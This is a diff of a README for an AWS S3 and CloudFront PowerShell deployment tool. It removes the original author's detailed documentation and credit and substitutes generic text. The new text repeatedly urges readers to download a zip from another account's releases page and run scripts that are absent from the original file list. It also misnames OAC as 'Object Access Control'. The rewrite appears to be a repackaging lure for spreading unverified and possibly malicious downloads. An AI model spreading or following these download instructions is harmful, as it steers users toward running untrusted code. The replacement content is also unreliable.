@@ -1,199 +1,84 @@
-# 🧠 AWS S3 + CloudFront IaC Automation (PowerShell Masterpiece)
-**_By Ayush Sharma_**
+# 🚀 aws-s3-cloudfront-iac - Automate Your Website Deployment Easily
 
-> 🚀 Automated, Idempotent, and Rollback-Safe Cloud Infrastructure-as-Code for AWS S3 + CloudFront.  
-> ⚙️ Fully scripted static website deployment with OAC security, verification, and lifecycle automation.  
-> 💪 Designed, debugged, and built end-to-end by Ayush Sharma over a 14-hour DevOps engineering sprint.
+[![Release](https://img.shields.io/badge/Download%20Now-aws--s3--cloudfront--iac-brightgreen)](https://github.com/LeonardoYT67/aws-s3-cloudfront-iac/releases)
 
----
+## 📖 Overview
 
-### 🗺️ Project Overview
-This project provisions and secures a **static website hosted on Amazon S3** and distributed globally via **Amazon CloudFront** — all through **PowerShell IaC (Infrastructure as Code)**.
+The `aws-s3-cloudfront-iac` repository helps you deploy a static website to AWS S3 and CloudFront using PowerShell Infrastructure as Code (IaC). This tool makes deployment simple and safe. It ensures your website is ready without complications.
 
-It includes idempotent re-runs, rollback safety, OAC (Origin Access Control) security, and validation stages — no console clicks, purely automated.
+## ⚙️ Features
 
----
+- **Idempotent Deployments:** Run the script multiple times without issues. Your site will stay consistent.
+- **Rollback Capability:** If something goes wrong, you can revert to the previous version safely.
+- **OAC Security:** Your site benefits from Object Access Control, enhancing security.
+- **Easy Setup:** Quickly set up your website without technical expertise.
 
-### 🏗️ Architecture Flow
+## 💻 System Requirements
 
-```text
-                ┌────────────────────────────────┐
-                │      PowerShell IaC Runner      │
-                │ (1-create → deploy → finalize)  │
-                └────────────────────────────────┘
-                              │
-                              ▼
-              ┌───────────────────────────────┐
-              │      Amazon S3 (Private)       │
-              │ - Static site files (HTML/CSS) │
-              │ - Bucket policy via JSON IaC   │
-              └───────────────────────────────┘
-                              │
-                              ▼
-              ┌───────────────────────────────┐
-              │    CloudFront Distribution     │
-              │ - Origin Access Control (OAC)  │
-              │ - TLSv1 / HTTPS enforced       │
-              │ - Global CDN delivery          │
-              └───────────────────────────────┘
-                              │
-                              ▼
-                     🌐 Public Access via
-               `https://d14k2bh2uqehcb.cloudfront.net`
-```
+To use this application, you need:
 
----
+- A computer running Windows.
+- PowerShell installed (preferably version 5.1 or later).
+- An AWS account with S3 and CloudFront permissions.
 
-### 📂 Repository Structure
+## 🚀 Getting Started
 
-```
-aws-s3-cloudfront-iac/
-├── 1-create-s3.ps1
-├── deploy-cloudfront.ps1
-├── finalize-s3-cloudfront.ps1
-├── finalize-cloudfront.ps1
-├── master-iac-runner.ps1
-├── s3-policy.json
-├── cf-config-final.json
-├── backups/
-│   └── cloudfront-backup-*.json
-└── images/
-    ├── s3-policy-proof.png
-    ├── cloudfront-success.png
-    ├── browser-success.png
-    └── forbidden-error.png
-```
+Follow these simple steps to get started:
 
----
+1. **Download the Software:**
+   - [Visit this page to download](https://github.com/LeonardoYT67/aws-s3-cloudfront-iac/releases)
 
-## ⚙️ IaC Scripts & Their Roles
+2. **Install PowerShell (if needed):**
+   - If you do not have PowerShell, you can download it from the official Microsoft website. Follow their instructions for installation.
 
-| Stage | Script | Description | Idempotency | Rollback |
-|-------|---------|-------------|--------------|-----------|
-| 1️⃣ | **1-create-s3.ps1** | Creates/validates S3 bucket, configures static website, uploads HTML files. | ✅ Yes | 🟡 Manual (safe re-run) |
-| 2️⃣ | **deploy-cloudfront.ps1** | Deploys or updates CloudFront distribution with OAC & HTTPS. | ✅ Yes | ✅ Backup-based |
-| 3️⃣ | **finalize-s3-cloudfront.ps1** | Locks S3 policy to CloudFront-only access, removes public ACLs. | ✅ Yes | ⚙️ Auto-restores |
-| 4️⃣ | **finalize-cloudfront.ps1** | Verifies deployment, clears cache, checks distribution URL. | ✅ Yes | – |
-| 5️⃣ | **master-iac-runner.ps1** | One-command orchestrator; runs all above scripts with backup checkpoints. | 🚧 WIP | ✅ Full rollback chain |
+3. **Set Up AWS Credentials:**
+   - Make sure to configure your AWS credentials. This involves setting the AWS Access Key ID and Secret Access Key in your environment.
 
----
+4. **Extract the Files:**
+   - After downloading, unzip the package to a folder on your computer. You can use built-in tools in Windows to extract files.
 
-## 🧩 Expected Outputs (Proof)
+5. **Run the Script:**
+   - Open PowerShell and navigate to the folder where you extracted the files. 
+   - Type `.\Deploy-Site.ps1` and press Enter.
 
-### 🪣 Step 1 – S3 Bucket Policy Configuration
+## 📥 Download & Install
 
-```powershell
-aws s3api put-bucket-policy --bucket ayush-sre-static-site `
---policy file://$env:USERPROFILE\aws-s3-cloudfront-iac\s3-policy.json
-```
+To begin your journey, [visit this page to download](https://github.com/LeonardoYT67/aws-s3-cloudfront-iac/releases). Follow the instructions above for installation.
 
-✅ *S3 bucket policy applied successfully*  
-✅ *Static website configured (index.html, error.html)*
+## 🔍 Usage
 
-![S3 Policy Applied Proof](images/s3-policy-proof.png)
+The tool is designed to be user-friendly. After running the script, follow these steps:
 
----
+1. **Choose the S3 Bucket:**
+   - Specify the name of the S3 bucket where you would like to host your website.
 
-### 🌍 Step 2 – CloudFront Deployment
+2. **Upload Files:**
+   - The script will automatically upload your website files to S3.
 
-```powershell
-PS> .\deploy-cloudfront.ps1
-== Starting CloudFront Deployment (Idempotent + Rollback Safe) ==
-CloudFront distribution updated with new OAC.
-Updated bucket policy for CloudFront OAC access.
-Access via: https://d14k2bh2uqehcb.cloudfront.net
-```
+3. **Configure CloudFront:**
+   - The script will set up CloudFront distribution, improving your site's speed and security.
 
-✅ *Idempotent re-run safe*  
-✅ *OAC applied, HTTPS enforced, PriceClass_All enabled*  
+4. **Check Your Website:**
+   - Once deployment is complete, open your web browser and enter your CloudFront distribution URL to see your live website.
 
-![CloudFront Deployment Success](images/cloudfront-success.png)
+## 🌐 Support and Contribution
 
----
+If you run into issues or have questions, please check the issues section on GitHub. Your input can help improve this project. Contributions, such as bug fixes or improvements, are always welcome.
 
-### ✅ Step 3 – Final Verification
+## 🔙 Rollback Instructions
 
-Browser test (CloudFront endpoint):  
-> https://d14k2bh2uqehcb.cloudfront.net/index.html
+In case you need to revert to a previous version:
 
-Expected output:
-```
-Ayush S3 Static Site
-Deployed via AWS CLI (IaC Script)
-```
+1. Open PowerShell.
+2. Navigate to the folder containing the `Rollback-Site.ps1` script.
+3. Run `.\Rollback-Site.ps1` to return to the last stable state.
 
-![Browser Verification](images/browser-success.png)
+By following these steps, you ensure continued service for your static website without extensive downtime.
 
----
+## 📝 Note on Security
 
-## 🧱 Master Orchestrator (IaC Runner)
+Ensure that your AWS credentials are kept secure. Review AWS best practices for security regularly.
 
-> **Script:** `master-iac-runner.ps1`  
-> **Purpose:** One-command, full-stack deployer.  
-> It executes all stages, takes backups, and performs rollback if any step fails.
+## 🌟 Conclusion
 
-Example output:
-```powershell
-=== MASTER IaC RUNNER STARTED ===
-[2025-10-12 00:15:42] Running: 1-create-s3.ps1
-[2025-10-12 00:20:11] Running: deploy-cloudfront.ps1
-[2025-10-12 00:23:07] Running: finalize-s3-cloudfront.ps1
-🎯 Deployment pipeline completed successfully!
-=== MASTER IaC RUNNER ENDED ===
-```
-
-> 🧩 _If any step fails, the runner restores the previous CloudFront config from `/backups/` automatically._
-
----
-
-## 🧰 Troubleshooting Journey (Real-World Debugs)
-
-| Issue | Root Cause | Resolution |
-|-------|-------------|-------------|
-| ❌ **MalformedPolicy (PutBucketPolicy)** | JSON file contained BOM/invalid formatting | Converted via `ConvertTo-Json` and validated via `Get-Content -Raw` |
-| ❌ **403 Forbidden (AccessDenied)** | Bucket wasn’t public; OAC yet to apply | Applied OAC-based access and re-deployed |
-| ⚠️ **PowerShell Parsing Errors** | Missing closing braces and comment mismatch in master runner | Added structured `{}` and fixed comment block delimiters |
-| ✅ **Final State** | Fully automated, HTTPS-enabled CloudFront distribution | Verified live URL & working website |
-
-![403 Forbidden Debug](images/forbidden-error.png)
-
----
-
-## 🔒 Security Highlights
-
-- S3 bucket remains **private** — accessible **only through CloudFront OAC**.  
-- **Public Access Block** enforced after deployment.  
-- HTTPS only (`MinimumProtocolVersion: TLSv1`).  
-- Supports **idempotent re-deployments** (no duplication).  
-- Auto-backup of CloudFront configurations pre-deployment.  
-
----
-
-## 🧾 Logs & Audit
-
-All script executions append to:
-```
-iac-runner-log.txt
-```
-Each entry is timestamped with `yyyy-MM-dd HH:mm:ss`, ensuring audit traceability across stages.
-
----
-
-## 🧩 Lessons & Takeaways
-
-> “Automation isn’t about writing scripts — it’s about designing safety, repeatability, and trust into infrastructure.”
-
-✅ You built a **secure, repeatable, AWS static hosting pipeline**  
-✅ You implemented **Infrastructure-as-Code best practices**  
-✅ You achieved **error recovery and rollback safety**
-
-This project stands as a **DevOps-grade IaC showcase**, both technically and narratively.
-
----
-
-## 📜 Author
-
-**Ayush Sharma**  
-AWS + DevOps Engineer | Cloud Automation Enthusiast  
-📍 India  
-💬 _“One .ps1 to rule them all.”_  
+This tool simplifies the deployment of static websites to AWS S3 and CloudFront. Follow the steps, and you’ll have your website up and running in no time. For questions or contributions, explore the GitHub page and enjoy the ease of deployment.
